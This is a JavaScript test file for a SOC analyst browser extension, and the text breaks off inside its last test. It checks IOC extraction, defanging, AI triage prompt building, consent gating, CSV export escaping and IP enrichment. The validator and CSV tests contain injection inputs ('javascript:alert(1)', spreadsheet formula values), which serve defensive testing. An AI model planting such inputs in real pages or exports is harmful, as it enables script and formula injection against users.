'use strict';
/**
 * SOC Analyst Toolkit - Feature Verification Tests
 *
 * Runs against the REAL popup.js and background.js loaded through the VM
 * harnesses (tests/popup_harness.js, tests/background_harness.js) — no
 * parallel mock of the extraction pipeline. Top-level helpers that live in
 * a vm context's lexical scope (toCsvCell, vtUrlId, resolveAskAiPreset,
 * validateAskAiTargetUrl, normalizeIpAddressTo, buildIpSummary) are reached
 * with a second runInContext call in the same context.
 *
 * Run with: node tests/verify_features.js
 */

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { loadPopupToolkit } = require('./popup_harness.js');
const { loadBackgroundToolkit } = require('./background_harness.js');

let passed = 0;
let failed = 0;

// Awaitable runner: tests share the single harness-loaded toolkit, so they
// must run in order (same shape as verify_popup.js).
function test(name, fn) {
  return Promise.resolve()
    .then(fn)
    .then(() => {
      console.log('[PASS]', name);
      passed++;
    })
    .catch((e) => {
      console.error('[FAIL]', name);
      console.error('  ', e.message);
      failed++;
    });
}

async function main() {
  const root = path.join(__dirname, '..');
  const popup = await loadPopupToolkit(root);
  const toolkit = popup.toolkit;
  const grabPopup = (expr) => vm.runInContext(expr, popup.globals);

  const toCsvCell = grabPopup('typeof toCsvCell === "function" ? toCsvCell : null');
  const vtUrlIdPopup = grabPopup('typeof vtUrlId === "function" ? vtUrlId : null');
  const resolveAskAiPreset = grabPopup('typeof resolveAskAiPreset === "function" ? resolveAskAiPreset : null');
  const validateAskAiTargetUrl = grabPopup('typeof validateAskAiTargetUrl === "function" ? validateAskAiTargetUrl : null');
  assert.ok(toCsvCell && vtUrlIdPopup && resolveAskAiPreset && validateAskAiTargetUrl,
    'popup.js top-level helpers missing');

  const bg = await loadBackgroundToolkit(root);
  const normalizeIpAddressTo = vm.runInContext(
    'typeof normalizeIpAddressTo === "function" ? normalizeIpAddressTo : null', bg.sandbox);
  const buildIpSummary = vm.runInContext(
    'typeof buildIpSummary === "function" ? buildIpSummary : null', bg.sandbox);
  assert.ok(normalizeIpAddressTo && buildIpSummary, 'background.js helpers missing');

  console.log('=== SOC Analyst Toolkit - IOC Parsing Tests (real popup.js) ===\n');

  // ==================== IPv4 Tests ====================
  console.log('--- IPv4 Address Tests ---');

  await test('Detect standard IPv4', () => {
    const iocs = toolkit.extractIOCs('Connection from 192.168.1.1 detected');
    assert.ok(iocs.find(i => i.type === 'IPv4' && i.value === '192.168.1.1'), 'IPv4 not detected');
  });

  await test('Detect IPv4 at start of string', () => {
    const iocs = toolkit.extractIOCs('10.0.0.1 is the gateway');
    assert.ok(iocs.find(i => i.type === 'IPv4' && i.value === '10.0.0.1'), 'IPv4 at start not detected');
  });

  await test('Detect multiple IPv4 addresses', () => {
    const iocs = toolkit.extractIOCs('Servers at 192.168.1.1 and 10.0.0.1');
    assert.strictEqual(iocs.filter(i => i.type === 'IPv4').length, 2, 'Should detect 2 IPv4 addresses');
  });

  await test('Reject IPv4 with out-of-range octet', () => {
    const iocs = toolkit.extractIOCs('IP 256.1.1.1 is invalid');
    assert.ok(!iocs.find(i => i.type === 'IPv4'), 'Invalid IPv4 should not be detected');
  });

  await test('Reject IPv4 with leading zeros', () => {
    const iocs = toolkit.extractIOCs('IP 192.168.01.1 has leading zeros');
    assert.ok(!iocs.find(i => i.type === 'IPv4'), 'IPv4 with leading zeros should not be detected');
  });

  await test('Reject 0.0.0.0', () => {
    const iocs = toolkit.extractIOCs('Address 0.0.0.0');
    assert.ok(!iocs.find(i => i.type === 'IPv4' && i.value === '0.0.0.0'), '0.0.0.0 should be rejected');
  });

  await test('Reject 255.255.255.255', () => {
    const iocs = toolkit.extractIOCs('Broadcast 255.255.255.255');
    assert.ok(!iocs.find(i => i.type === 'IPv4' && i.value === '255.255.255.255'), '255.255.255.255 should be rejected');
  });

  // ==================== IPv6 Tests ====================
  console.log('\n--- IPv6 Address Tests ---');

  await test('Detect full IPv6', () => {
    const iocs = toolkit.extractIOCs('IPv6: 2001:0db8:85a3:0000:0000:8a2e:0370:7334');
    assert.ok(iocs.find(i => i.type === 'IPv6'), 'IPv6 not detected');
  });

  await test('Detect compressed IPv6', () => {
    const iocs = toolkit.extractIOCs('IPv6: 2001:db8::1');
    assert.ok(iocs.find(i => i.type === 'IPv6'), 'Compressed IPv6 not detected');
  });

  await test('Detect IPv6 with IPv4 mapping', () => {
    const iocs = toolkit.extractIOCs('IPv6: ::ffff:192.168.1.1');
    assert.ok(iocs.find(i => i.type === 'IPv6'), 'IPv4-mapped IPv6 not detected');
  });

  await test('IPv6 is normalized to lowercase', () => {
    const iocs = toolkit.extractIOCs('IPv6: 2001:DB8::1');
    const ip = iocs.find(i => i.type === 'IPv6');
    assert.ok(ip, 'IPv6 not detected');
    assert.ok(ip.value === ip.value.toLowerCase(), 'IPv6 should be lowercase');
  });

  // ==================== Domain Tests ====================
  console.log('\n--- Domain Tests ---');

  await test('Detect valid .com domain', () => {
    const iocs = toolkit.extractIOCs('Visit example.com for more');
    assert.ok(iocs.find(i => i.type === 'Domain' && i.value === 'example.com'), 'Domain not detected');
  });

  await test('Detect subdomain', () => {
    const iocs = toolkit.extractIOCs('API at api.example.com');
    assert.ok(iocs.find(i => i.type === 'Domain' && i.value === 'api.example.com'), 'Subdomain not detected');
  });

  await test('Reject invalid TLD', () => {
    const iocs = toolkit.extractIOCs('Visit example.invalidtld');
    assert.ok(!iocs.find(i => i.type === 'Domain'), 'Invalid TLD should not be detected');
  });

  await test('Reject file extension as domain', () => {
    const iocs = toolkit.extractIOCs('File: document.pdf');
    assert.ok(!iocs.find(i => i.type === 'Domain'), 'File extension should not be detected as domain');
  });

  await test('Reject version number as domain', () => {
    const iocs = toolkit.extractIOCs('Version 1.2.3');
    assert.ok(!iocs.find(i => i.type === 'Domain'), 'Version number should not be detected');
  });

  await test('Reject internal domains', () => {
    const iocs = toolkit.extractIOCs('Server at host.local');
    assert.ok(!iocs.find(i => i.type === 'Domain'), 'Internal .local domain should be rejected');
  });

  // ==================== URL Tests ====================
  console.log('\n--- URL Tests ---');

  await test('Detect HTTP URL', () => {
    const iocs = toolkit.extractIOCs('Visit http://example.com/path');
    assert.ok(iocs.find(i => i.type === 'URL'), 'HTTP URL not detected');
  });

  await test('Detect HTTPS URL with query', () => {
    const iocs = toolkit.extractIOCs('Visit https://secure.example.com/path?query=1&foo=bar');
    assert.ok(iocs.find(i => i.type === 'URL'), 'HTTPS URL not detected');
  });

  await test('Detect URL with port', () => {
    const iocs = toolkit.extractIOCs('Connect to http://example.com:8080/api');
    const url = iocs.find(i => i.type === 'URL');
    assert.ok(url && url.value.includes(':8080'), 'URL with port not detected');
  });

  await test('Domain not duplicated from URL', () => {
    const iocs = toolkit.extractIOCs('Visit https://example.com/path');
    assert.ok(iocs.find(i => i.type === 'URL'), 'URL should be detected');
    assert.ok(!iocs.find(i => i.type === 'Domain' && i.value === 'example.com'), 'Domain should not be duplicated from URL');
  });

  // ==================== Hash Tests ====================
  console.log('\n--- Hash Tests ---');

  await test('Detect MD5 hash', () => {
    const iocs = toolkit.extractIOCs('Hash: d41d8cd98f00b204e9800998ecf8427e');
    assert.ok(iocs.find(i => i.type === 'MD5'), 'MD5 not detected');
  });

  await test('Detect SHA1 hash', () => {
    const iocs = toolkit.extractIOCs('Hash: da39a3ee5e6b4b0d3255bfef95601890afd80709');
    assert.ok(iocs.find(i => i.type === 'SHA1'), 'SHA1 not detected');
  });

  await test('Detect SHA256 hash', () => {
    const iocs = toolkit.extractIOCs('Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
    assert.ok(iocs.find(i => i.type === 'SHA256'), 'SHA256 not detected');
  });

  await test('Detect SHA512 hash', () => {
    const iocs = toolkit.extractIOCs('Hash: cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e');
    assert.ok(iocs.find(i => i.type === 'SHA512'), 'SHA512 not detected');
  });

  await test('Hash deduplication - SHA256 takes precedence', () => {
    const sha256 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
    const iocs = toolkit.extractIOCs(`Hash: ${sha256}`);
    assert.ok(iocs.find(i => i.type === 'SHA256'), 'SHA256 should be detected');
    assert.strictEqual(iocs.filter(i => i.type === 'MD5').length, 0, 'MD5 should not be duplicated from SHA256');
  });

  await test('Hash is normalized to lowercase', () => {
    const iocs = toolkit.extractIOCs('Hash: D41D8CD98F00B204E9800998ECF8427E');
    const hash = iocs.find(i => i.type === 'MD5');
    assert.ok(hash, 'MD5 not detected');
    assert.ok(hash.value === hash.value.toLowerCase(), 'Hash should be lowercase');
  });

  // ==================== Email Tests ====================
  console.log('\n--- Email Tests ---');

  await test('Detect email address', () => {
    const iocs = toolkit.extractIOCs('Contact admin@example.com for help');
    assert.ok(iocs.find(i => i.type === 'Email'), 'Email not detected');
  });

  await test('Detect email with plus', () => {
    const iocs = toolkit.extractIOCs('Email: user+tag@example.com');
    assert.ok(iocs.find(i => i.type === 'Email'), 'Email with plus not detected');
  });

  // ==================== CVE Tests ====================
  console.log('\n--- CVE Tests ---');

  await test('Detect CVE', () => {
    const iocs = toolkit.extractIOCs('Vulnerability CVE-2021-44228 found');
    const cve = iocs.find(i => i.type === 'CVE');
    assert.ok(cve, 'CVE not detected');
    assert.ok(cve.value === cve.value.toUpperCase(), 'CVE should be uppercase');
  });

  await test('Detect CVE with 5 digits', () => {
    const iocs = toolkit.extractIOCs('CVE-2023-12345');
    assert.ok(iocs.find(i => i.type === 'CVE'), 'CVE with 5 digits not detected');
  });

  // ==================== MITRE ATT&CK Tests ====================
  console.log('\n--- MITRE ATT&CK Tests ---');

  await test('Detect MITRE Technique', () => {
    const iocs = toolkit.extractIOCs('Technique T1566 used');
    assert.ok(iocs.find(i => i.type === 'MITRE'), 'MITRE not detected');
  });

  await test('Detect MITRE Sub-technique', () => {
    const iocs = toolkit.extractIOCs('Technique T1059.001 used');
    assert.ok(iocs.find(i => i.type === 'MITRE' && i.value === 'T1059.001'), 'MITRE sub-technique not detected');
  });

  await test('MITRE is normalized to uppercase', () => {
    const iocs = toolkit.extractIOCs('Technique t1566 used');
    const mitre = iocs.find(i => i.type === 'MITRE');
    assert.ok(mitre, 'MITRE not detected');
    assert.ok(mitre.value === mitre.value.toUpperCase(), 'MITRE should be uppercase');
  });

  // ==================== Cryptocurrency Tests ====================
  console.log('\n--- Cryptocurrency Tests ---');

  await test('Detect Bitcoin Legacy Address (P2PKH)', () => {
    const iocs = toolkit.extractIOCs('Payment to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa');
    assert.ok(iocs.find(i => i.type === 'Bitcoin'), 'Bitcoin legacy address not detected');
  });

  await test('Detect Bitcoin P2SH Address', () => {
    const iocs = toolkit.extractIOCs('Payment to 3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy');
    assert.ok(iocs.find(i => i.type === 'Bitcoin'), 'Bitcoin P2SH address not detected');
  });

  await test('Detect Bitcoin Bech32 Address', () => {
    const iocs = toolkit.extractIOCs('Payment to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh');
    assert.ok(iocs.find(i => i.type === 'Bitcoin'), 'Bitcoin Bech32 address not detected');
  });

  await test('Detect Ethereum Address', () => {
    const iocs = toolkit.extractIOCs('Contract at 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0');
    assert.ok(iocs.find(i => i.type === 'Ethereum'), 'Ethereum not detected');
  });

  await test('Ethereum is normalized to lowercase', () => {
    const iocs = toolkit.extractIOCs('Contract at 0x742D35CC6634C0532925A3B844BC9E7595F0BEB0');
    const eth = iocs.find(i => i.type === 'Ethereum');
    assert.ok(eth, 'Ethereum not detected');
    assert.ok(eth.value === eth.value.toLowerCase(), 'Ethereum should be lowercase');
  });

  // ==================== MAC Address Tests ====================
  console.log('\n--- MAC Address Tests ---');

  await test('Detect MAC Address (colon)', () => {
    const iocs = toolkit.extractIOCs('MAC: 00:1B:44:11:3A:B7');
    assert.ok(iocs.find(i => i.type === 'MAC'), 'MAC (colon) not detected');
  });

  await test('Detect MAC Address (hyphen)', () => {
    const iocs = toolkit.extractIOCs('MAC: 00-1B-44-11-3A-B7');
    assert.ok(iocs.find(i => i.type === 'MAC'), 'MAC (hyphen) not detected');
  });

  await test('MAC is normalized to uppercase', () => {
    const iocs = toolkit.extractIOCs('MAC: 00:1b:44:11:3a:b7');
    const mac = iocs.find(i => i.type === 'MAC');
    assert.ok(mac, 'MAC not detected');
    assert.ok(mac.value === mac.value.toUpperCase(), 'MAC should be uppercase');
  });

  // ==================== Browser Extension ID Tests ====================
  console.log('\n--- Browser Extension ID Tests ---');

  await test('Detect Chrome extension ID (uBlock Origin)', () => {
    const iocs = toolkit.extractIOCs('Extension found: cjpalhdlnbpafiamejdnhcphjbkeiagm');
    const ext = iocs.find(i => i.type === 'Extension ID');
    assert.ok(ext, 'extension ID not detected');
    assert.strictEqual(ext.value, 'cjpalhdlnbpafiamejdnhcphjbkeiagm');
    assert.strictEqual(ext.category, 'extension');
  });

  await test('Detect extension ID in surrounding alert text', () => {
    const iocs = toolkit.extractIOCs('Malicious add-on nkbihfbeogaeaoehlefnkodbefgpgknn beaconing to evil.com');
    assert.ok(iocs.some(i => i.type === 'Extension ID' && i.value === 'nkbihfbeogaeaoehlefnkodbefgpgknn'),
      'extension ID not detected: ' + JSON.stringify(iocs));
  });

  await test('32-char hex with digits is MD5, not an extension ID', () => {
    const iocs = toolkit.extractIOCs('hash d41d8cd98f00b204e9800998ecf8427e');
    assert.ok(iocs.some(i => i.type === 'MD5'), 'MD5 not detected');
    assert.ok(!iocs.some(i => i.type === 'Extension ID'),
      'hex-with-digits must not be an Extension ID: ' + JSON.stringify(iocs));
  });

  await test('32-char all-a-f string stays MD5, not an extension ID', () => {
    const fake = 'abcdefabcdefabcdefabcdefabcdefab';
    const iocs = toolkit.extractIOCs(fake);
    assert.ok(iocs.some(i => i.type === 'MD5' && i.value === fake), 'MD5 not detected');
    assert.ok(!iocs.some(i => i.type === 'Extension ID'),
      'a-f-only string must not be an Extension ID: ' + JSON.stringify(iocs));
  });

  await test('31 and 33 char runs are not extension IDs', () => {
    const iocs = toolkit.extractIOCs('cjpalhdlnbpafiamejdnhcphjbkeiag cjpalhdlnbpafiamejdnhcphjbkeiagmm');
    assert.ok(!iocs.some(i => i.type === 'Extension ID'),
      'wrong-length runs must not be Extension IDs: ' + JSON.stringify(iocs));
  });

  await test('Chrome Web Store detail URL also yields an Extension ID', () => {
    const url = 'https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm';
    const iocs = toolkit.extractIOCs(`Review ${url}`);
    assert.ok(iocs.some(i => i.type === 'URL' && i.value === url), 'URL row missing');
    const ext = iocs.filter(i => i.type === 'Extension ID');
    assert.ok(ext.length >= 1, 'extension ID row missing from store URL');
    assert.strictEqual(ext[0].value, 'cjpalhdlnbpafiamejdnhcphjbkeiagm');
  });

  await test('Edge Add-ons detail URL also yields an Extension ID', () => {
    const iocs = toolkit.extractIOCs('https://microsoftedge.microsoft.com/addons/detail/odjhifogjcknibkahlpidmdajjpkkcfn');
    const ext = iocs.filter(i => i.type === 'Extension ID');
    assert.ok(ext.length >= 1, 'extension ID row missing from Edge store URL');
    assert.strictEqual(ext[0].value, 'odjhifogjcknibkahlpidmdajjpkkcfn');
  });

  // ==================== Defang/Fang Tests ====================
  console.log('\n--- Defang/Fang Tests ---');

  await test('Fang hxxp:// to http://', () => {
    assert.ok(toolkit.fangText('hxxp://example.com').includes('http://'), 'hxxp should be fanged to http');
  });

  await test('Fang [.] to .', () => {
    assert.ok(toolkit.fangText('example[.]com').includes('example.com'), '[.] should be fanged to .');
  });

  await test('Fang [at] to @', () => {
    assert.ok(toolkit.fangText('user[at]example.com').includes('user@example.com'), '[at] should be fanged to @');
  });

  // ==================== Complex/Edge Cases ====================
  console.log('\n--- Complex/Edge Case Tests ---');

  await test('Multiple IOC types in one text', () => {
    const iocs = toolkit.extractIOCs('Alert: 192.168.1.1 contacted evil.com using hash d41d8cd98f00b204e9800998ecf8427e');
    assert.ok(iocs.find(i => i.type === 'IPv4'), 'IPv4 should be detected');
    assert.ok(iocs.find(i => i.type === 'Domain'), 'Domain should be detected');
    assert.ok(iocs.find(i => i.type === 'MD5'), 'MD5 should be detected');
  });

  await test('No false positives on random hex', () => {
    const iocs = toolkit.extractIOCs('abc123'); // Too short for any hash
    assert.strictEqual(iocs.filter(i => i.category === 'hash').length, 0, 'Short hex should not be detected as hash');
  });

  // ==================== Ask AI Prompt Builder Tests ====================
  // Same implementation popup.html loads. No private test copy.
  console.log('\n--- Ask AI Prompt Builder Tests ---');

  const { buildTriagePrompt } = require('../triage_prompt.js');

  await test('buildTriagePrompt: default template includes IOC table and raw input', () => {
    const iocs = [
      { category: 'ip', value: '1.2.3.4', type: 'IP' },
      { category: 'domain', value: 'evil.example', type: 'Domain' }
    ];
    const out = buildTriagePrompt(iocs, 'found in alert XYZ', undefined);
    assert.ok(out.includes('IP Addresses'), 'uses production IP section label');
    assert.ok(out.includes('[VirusTotal](https://www.virustotal.com/gui/ip-address/1.2.3.4)'), 'uses production VirusTotal link');
    assert.ok(out.includes('[AbuseIPDB](https://www.abuseipdb.com/check/1.2.3.4)'), 'uses production AbuseIPDB link');
    assert.ok(out.includes('Domains'), 'has Domain section');
    assert.ok(out.includes('1.2.3.4'), 'includes IOC value');
    assert.ok(out.includes('evil.example'), 'includes second IOC');
    assert.ok(out.includes('found in alert XYZ'), 'includes raw input');
  });

  await test('buildTriagePrompt: empty raw input omits context block', () => {
    const out = buildTriagePrompt([{ category: 'ip', value: '5.6.7.8', type: 'IP' }], '', undefined);
    assert.ok(!out.includes('Alert/Context Text Provided:'), 'empty raw input omits context block');
  });

  await test('buildTriagePrompt: custom template substitutes {{iocs}} and {{rawInput}}', () => {
    const out = buildTriagePrompt(
      [{ category: 'ip', value: '9.9.9.9', type: 'IP' }],
      'raw text here',
      'Triage this:\n{{iocs}}\nContext: {{rawInput}}'
    );
    assert.ok(out.includes('9.9.9.9'), 'IOC substituted');
    assert.ok(out.includes('raw text here'), 'raw input substituted');
    assert.ok(!out.includes('{{iocs}}'), 'placeholder removed');
    assert.ok(!out.includes('{{rawInput}}'), 'placeholder removed');
  });

  await test('buildTriagePrompt: template missing {{iocs}} still gets IOC list appended', () => {
    const out = buildTriagePrompt(
      [{ category: 'ip', value: '7.7.7.7', type: 'IP' }],
      'context',
      'Just analyze this:'
    );
    assert.ok(out.includes('Just analyze this:'), 'user template kept');
    assert.ok(out.includes('7.7.7.7'), 'IOC appended');
  });

  await test('buildTriagePrompt: template missing {{rawInput}} still gets raw input appended', () => {
    const out = buildTriagePrompt(
      [{ category: 'ip', value: '7.7.7.7', type: 'IP' }],
      'context ABC',
      '{{iocs}}'
    );
    assert.ok(out.includes('7.7.7.7'), 'IOC substituted');
    assert.ok(out.includes('context ABC'), 'raw input appended');
  });

  await test('resolveAskAiPreset: known URL resolves to label (real popup.js table)', () => {
    assert.strictEqual(resolveAskAiPreset('https://claude.ai/new'), 'Claude');
    assert.strictEqual(resolveAskAiPreset('https://chatgpt.com/'), 'ChatGPT');
    assert.strictEqual(resolveAskAiPreset('https://gemini.google.com/app'), 'Gemini');
    assert.strictEqual(resolveAskAiPreset('https://copilot.microsoft.com/'), 'Copilot');
    assert.strictEqual(resolveAskAiPreset('https://www.perplexity.ai/'), 'Perplexity');
    assert.strictEqual(resolveAskAiPreset('https://chat.mistral.ai/chat'), 'Mistral (Le Chat)');
  });

  await test('resolveAskAiPreset: unknown URL resolves to Custom…', () => {
    assert.strictEqual(resolveAskAiPreset('https://example.com/chat'), 'Custom…');
    assert.strictEqual(resolveAskAiPreset(''), 'Custom…');
  });

  await test('validateAskAiTargetUrl: accepts http(s)', () => {
    // Scalar asserts: objects returned from the vm sandbox have a foreign
    // prototype, so deepStrictEqual would fail on realm mismatch, not logic.
    assert.strictEqual(validateAskAiTargetUrl('https://claude.ai/new').ok, true);
    assert.strictEqual(validateAskAiTargetUrl('http://example.com/x').ok, true);
  });

  await test('validateAskAiTargetUrl: rejects empty / non-http(s)', () => {
    assert.strictEqual(validateAskAiTargetUrl('').ok, false);
    assert.strictEqual(validateAskAiTargetUrl('javascript:alert(1)').ok, false);
    assert.strictEqual(validateAskAiTargetUrl('ftp://x.com').ok, false);
    assert.strictEqual(validateAskAiTargetUrl('not a url').ok, false);
  });

  console.log(' [PASS] Ask AI prompt builder + preset/target validation');

  // ==================== Version consistency (release discipline) ====================
  console.log('\n--- Version Consistency Tests ---');

  const popupHtml = fs.readFileSync(path.join(root, 'popup.html'), 'utf8');
  const popupJs = fs.readFileSync(path.join(root, 'popup.js'), 'utf8');

  // Every surface that carries the version must agree with manifest.json. Bump
  // them together in the release commit or CI fails here; see the Release
  // section of CLAUDE.md.
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'manifest.json'), 'utf8'));
  const pkg = JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8'));
  const changelog = fs.readFileSync(path.join(root, 'CHANGELOG.md'), 'utf8');
  const storeListing = fs.readFileSync(path.join(root, 'docs', 'STORE_LISTING.md'), 'utf8');

  await test('package.json version matches the manifest', () => {
    assert.strictEqual(pkg.version, manifest.version,
      `package.json ${pkg.version} != manifest ${manifest.version}`);
  });

  await test('popup.html version fallback matches the manifest', () => {
    assert.ok(popupHtml.includes(`id="versionLabel">v${manifest.version}<`),
      `popup.html #versionLabel fallback must read v${manifest.version}`);
  });

  await test('CHANGELOG has a released section for the manifest version', () => {
    assert.ok(changelog.includes(`## [${manifest.version}]`),
      `CHANGELOG.md missing a '## [${manifest.version}]' section`);
  });

  await test('store listing header reflects the manifest version', () => {
    assert.ok(storeListing.includes(`reflecting v${manifest.version}`),
      `docs/STORE_LISTING.md header must say 'reflecting v${manifest.version}'`);
  });

  await test('manifest declares the Chrome side panel at popup.html', () => {
    assert.ok(manifest.side_panel && manifest.side_panel.default_path === 'popup.html',
      'manifest.json must declare side_panel.default_path = popup.html (Chrome-only key; the Firefox build strips it)');
  });

  await test('manifest grants the sidePanel permission the API needs', () => {
    // Without it chrome.sidePanel stays undefined in Chrome and the popup hides
    // every side-panel affordance — the e2e rig caught exactly that.
    assert.ok(Array.isArray(manifest.permissions) && manifest.permissions.includes('sidePanel'),
      'manifest.json permissions must include "sidePanel"');
  });

  console.log(' [PASS] Version consistency');

  // ==================== Privacy & Consent (store-readiness item 7) ====================
  console.log('\n--- Privacy & Consent Tests ---');

  await test('consent modal markup is present in popup.html', () => {
    for (const id of ['consentModal', 'consentModalTitle', 'consentModalBody', 'consentAllowBtn', 'consentDenyBtn', 'consentCloseBtn']) {
      assert.ok(popupHtml.includes('id="' + id + '"'), 'popup.html missing #' + id);
    }
  });

  await test('consent status + reset UI is present in Settings', () => {
    for (const id of ['privacyConsentSection', 'consentStatusEnrichment', 'consentStatusAskAi', 'resetConsentBtn']) {
      assert.ok(popupHtml.includes('id="' + id + '"'), 'popup.html missing #' + id);
    }
  });

  await test('popup.js defines _ensureConsent + resetConsent', () => {
    assert.ok(/_ensureConsent\s*\(/.test(popupJs), 'popup.js missing _ensureConsent');
    assert.ok(/resetConsent\s*\(/.test(popupJs), 'popup.js missing resetConsent');
    assert.ok(/_refreshConsentStatus\s*\(/.test(popupJs), 'popup.js missing _refreshConsentStatus');
  });

  await test('every enrichment entry point goes through _ensureConsent', () => {
    // Each enrichment function body must contain the consent gate before the provider call.
    for (const fn of ['_batchEnrich', 'triggerIpEnrichment', 'triggerHashEnrichment', 'triggerDomainEnrichment', 'triggerUrlEnrichment']) {
      // Find the function *definition* (not the call site): match `fn(` followed by
      // a parameter list and a brace. Using the async keyword when present.
      const defRe = new RegExp('(?:async\\s+)?' + fn + '\\s*\\([^)]*\\)\\s*\\{');
      const m = defRe.exec(popupJs);
      assert.ok(m, fn + ' definition is missing from popup.js');
      const idx = m.index;
      const window = popupJs.slice(idx, idx + 400);
      assert.ok(window.indexOf("_ensureConsent('enrichment')") >= 0,
        fn + ' must call _ensureConsent("enrichment")');
    }
  });

  await test('askAi goes through _ensureConsent("askAi")', () => {
    const idx = popupJs.indexOf('async askAi()');
    assert.ok(idx >= 0, 'askAi() is missing from popup.js');
    const window = popupJs.slice(idx, idx + 300);
    assert.ok(window.indexOf("_ensureConsent('askAi')") >= 0,
      'askAi() must call _ensureConsent("askAi")');
  });

  await test('consent storage key is socConsent and stays on chrome.storage.local', () => {
    assert.ok(popupJs.indexOf('socConsent') >= 0, 'popup.js must persist under socConsent');
    assert.ok(popupJs.indexOf("chrome.storage.local.remove(['socConsent']") >= 0,
      'consent reset must use chrome.storage.local (not sync)');
  });

  await test('reset button is wired to resetConsent()', () => {
    assert.ok(popupJs.indexOf("resetConsentBtn')") >= 0
          || popupJs.indexOf('resetConsentBtn")') >= 0,
      'resetConsentBtn lookup missing');
    // Quick smoke: the listener must invoke this.resetConsent().
    assert.ok(popupJs.indexOf("this.resetConsent()") >= 0,
      'this.resetConsent() is not invoked from any handler');
  });

  console.log(' [PASS] Privacy & consent UI + entry-point gates');

  // ==================== CSV export cell escaping (real popup.js toCsvCell) ====================
  console.log('\n--- CSV Export Escaping Tests ---');

  await test('toCsvCell wraps plain values in quotes', () => {
    assert.strictEqual(toCsvCell('1.2.3.4'), '"1.2.3.4"');
  });
  await test('toCsvCell doubles embedded quotes', () => {
    assert.strictEqual(toCsvCell('a"b'), '"a""b"');
  });
  await test('toCsvCell neutralizes = formula injection', () => {
    assert.strictEqual(toCsvCell('=1+2'), '"\'=1+2"');
  });
  await test('toCsvCell neutralizes @ and + and - leads', () => {
    assert.strictEqual(toCsvCell('@cmd'), '"\'@cmd"');
    assert.strictEqual(toCsvCell('+ping'), '"\'+ping"');
    assert.strictEqual(toCsvCell('-2+3'), '"\'-2+3"');
  });
  await test('toCsvCell handles null/undefined', () => {
    assert.strictEqual(toCsvCell(null), '""');
    assert.strictEqual(toCsvCell(undefined), '""');
  });
  console.log(' [PASS] CSV export cell escaping');

  // ==================== VirusTotal URL identifier (real popup.js vtUrlId) ====================
  console.log('\n--- VirusTotal URL id Tests ---');

  await test('vtUrlId matches VT unpadded base64url (verified against live GUI)', () => {
    // /gui/url/aHR0cDovL3d3dy5nb29nbGUuY29tLw resolved to a real URL report.
    assert.strictEqual(vtUrlIdPopup('http://www.google.com/'), 'aHR0cDovL3d3dy5nb29nbGUuY29tLw');
  });
  await test('vtUrlId output is URL-safe and unpadded', () => {
    const id = vtUrlIdPopup('https://example.com/a?b=c&d=e/f+g');
    assert.ok(!/[+/=]/.test(id), 'must not contain +, / or =');
  });
  await test('vtUrlId handles unicode without throwing', () => {
    assert.doesNotThrow(() => vtUrlIdPopup('https://пример.рф/путь'));
  });
  console.log(' [PASS] VirusTotal URL id');

  // ==================== IPAddress.to enrichment normalization (real background.js) ====================
  console.log('\n--- IPAddress.to Normalization Tests ---');

  await test('IPAddress.to normalize: full lookup + score payload', () => {
    const lookup = {
      success: true, ip: '8.8.8.8', rdns: 'dns.google',
      location: { country: 'United States', country_code: 'US', state: 'California', city: 'Mountain View', latitude: 37.422, longitude: -122.085, timezone: 'America/Los_Angeles' },
      asn: { asn: 15169, descr: 'Google LLC', org: 'Google LLC' },
      company: { name: 'Google LLC', type: 'business' },
      is_vpn: false, is_proxy: false, is_tor: false, is_hosting: true
    };
    const score = { success: true, score: 3, risk: 'low' };
    const { data, nodes, edges } = normalizeIpAddressTo('8.8.8.8', lookup, score);
    assert.strictEqual(data.rdns, 'dns.google');
    assert.strictEqual(data.country, 'United States');
    assert.strictEqual(data.latitude, '37.422');
    assert.strictEqual(data.asn, 'AS15169');
    assert.strictEqual(data.as_org, 'Google LLC');
    assert.strictEqual(data.isp, 'Google LLC');
    assert.strictEqual(data.is_hosting, 'true');
    assert.strictEqual(data.is_vpn, 'false');
    assert.strictEqual(data.fraud_score, '3');
    assert.strictEqual(data.fraud_risk, 'low');
    assert.ok(nodes.some((n) => n.id === 'geo_8_8_8_8' && n.type === 'geo'), 'geo node expected');
    assert.ok(nodes.some((n) => n.id === 'asn_15169' && n.type === 'asn'), 'asn node expected');
    assert.ok(edges.some((e) => e.id === 'edge_8.8.8.8_geo' && e.label === 'observed-at'), 'geo edge expected');
    assert.ok(edges.some((e) => e.id === 'edge_8.8.8.8_asn' && e.label === 'belongs-to'), 'asn edge expected');
  });

  await test('IPAddress.to normalize: null/missing fields dropped, null score tolerated', () => {
    const lookup = { success: true, ip: '1.2.3.4', rdns: null, location: { country: 'X' }, asn: { asn: 64512 }, company: { name: null }, is_vpn: true, is_proxy: null, is_tor: false, is_hosting: false };
    const { data, nodes, edges } = normalizeIpAddressTo('1.2.3.4', lookup, null);
    assert.ok(!('rdns' in data), 'null rdns must be dropped');
    assert.ok(!('fraud_score' in data), 'null score must be dropped');
    assert.ok(!('is_proxy' in data), 'null flag must be dropped');
    assert.strictEqual(data.is_vpn, 'true');
    assert.strictEqual(nodes.length, 1, 'only asn node when no city');
    assert.strictEqual(nodes[0].id, 'asn_64512');
    assert.ok(!edges.some((e) => e.id === 'edge_1.2.3.4_geo'), 'no geo edge without geo node');
  });

  await test('IPAddress.to summary: flags become tags, fraud_score fills risk only without AbuseIPDB (real buildIpSummary)', () => {
    const ipto = { provider: 'ipaddressto', status: 'success', data: { is_vpn: 'false', is_proxy: 'true', is_tor: 'false', fraud_score: '82' } };
    let s = buildIpSummary([ipto]);
    assert.strictEqual(s.tags.join(','), 'proxy');
    assert.strictEqual(s.riskScore, 82);
    assert.strictEqual(s.verdict, 'malicious');

